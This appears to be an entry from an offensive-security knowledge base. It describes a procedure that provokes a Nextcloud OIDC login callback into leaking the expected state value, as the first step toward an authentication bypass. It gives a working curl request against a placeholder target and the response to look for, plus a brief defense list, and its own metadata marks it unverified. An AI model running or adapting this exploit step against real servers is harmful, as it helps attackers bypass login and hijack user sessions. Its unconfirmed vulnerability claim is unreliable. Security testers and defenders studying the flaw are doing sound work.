---
id: proc-002
name: Trigger-State-Mismatch-Error
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.577Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
tags:
  - csrf
  - state-leak
  - nextcloud
commands:
  - '[[commands/curl-mismatched-state]]'
platforms:
  - Web
  - PHP
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
---

# Trigger-State-Mismatch-Error

## Summary

This procedure intentionally submits an invalid state parameter to the OIDC callback endpoint, triggering a JSON error response that leaks the expected state due to debug code in LoginController.php.

## Description

The vulnerability stems from lines 336-344 in /lib/private/Controller/LoginController.php, where error handling exposes the session's expected state in JSON instead of a generic message, allowing attackers to obtain the correct value.

## Requirements

1. Active session from prior initiation
2. Knowledge of the callback endpoint
3. Ability to craft POST requests with form data

## Defense

Defensive measures and detection strategies:

- Remove debug code from production error responses
- Log and alert on state mismatch errors
- Implement rate limiting on login callbacks

## Objectives

1. Provoke the state leak
2. Capture the expected state value
3. Set up for bypass in next step

## Instructions

### Step 1: Submit Invalid State to Callback

**Context**: Mimic a callback with wrong state to get the leak.

**Command** ([[commands/curl-mismatched-state]]):
```bash
curl -b cookies.txt -X POST "https://target.com/index.php/login?openIdConnect=callback" -d "state=invalid_state&code=some_code" -H "Content-Type: application/x-www-form-urlencoded" -o error.json
```

> Saves response to error.json; expect JSON with leaked state.

### Step 2: Inspect Leaked Response

**Context**: Confirm the leak occurred.

**Command** ([[commands/curl-mismatched-state]]):
```bash
cat error.json
```

> Look for {"error":"Invalid state","expected_state":"leaked_value"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used

- [[commands/curl-mismatched-state]]

## Tools Used


## Tags

- [[csrf]]
- [[state-leak]]
- [[nextcloud]]
